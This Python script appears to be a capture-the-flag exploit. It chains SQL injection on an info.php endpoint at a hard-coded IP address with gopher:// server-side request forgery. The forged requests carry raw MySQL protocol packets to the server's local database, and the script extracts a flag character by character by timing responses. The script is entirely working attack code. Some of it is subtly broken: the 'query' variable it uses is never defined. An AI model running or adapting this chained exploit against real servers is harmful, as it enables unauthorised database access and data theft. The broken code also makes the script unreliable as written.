import requests
import time

auth = """aa00000185a6ff0100000001210000000000000000000000000000000000000000000000666c34675f6d346e3467337200006d7973716c5f6e61746976655f70617373776f72640065035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404363439390f5f636c69656e745f76657273696f6e06352e372e3231095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c
210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031""".replace("\n", "")


def encode(s):
    a = [s[i:i + 2] for i in range(0, len(s), 2)]
    return "gopher://127.0.0.1:3306/_%" + "%".join(a)


def get_payload(query):
    query = query.encode().hex()
    query_length = '{:x}'.format((int((len(query) / 2) + 1)))
    pay1 = query_length + "00000003" + query
    final = encode(auth + pay1 + "0100000001").replace("%", "%%25")
    return final


flag = ""
for x in range(0, 50):
    for x in range(32, 127):
        if chr(x) in "%":
            continue
        if chr(x) in "_":
            continue
        print(query.format(flag + chr(x)))
        url = "http://128.199.179.156/info.php?uid=poop%1$c%20%20UNION%20SELECT%20%1$chuzzah%1$c,%20description,%20%1$c{}%1$c%20from%20goods;%20%23"

        full_url = url.format(get_payload(query.format(flag + chr(x))))
        try:
            # print(full_url)
            r = requests.get(full_url, cookies={"PHPSESSID": "ie4168ud7tc4cal4ear3m0kih3"}, timeout=3)
            # print(r.text)
        except Exception:
            print("Found Letter: " + chr(x))
            flag += chr(x)
            print(flag)
            time.sleep(3)
            break
        if x >= 126:
            flag += "_"
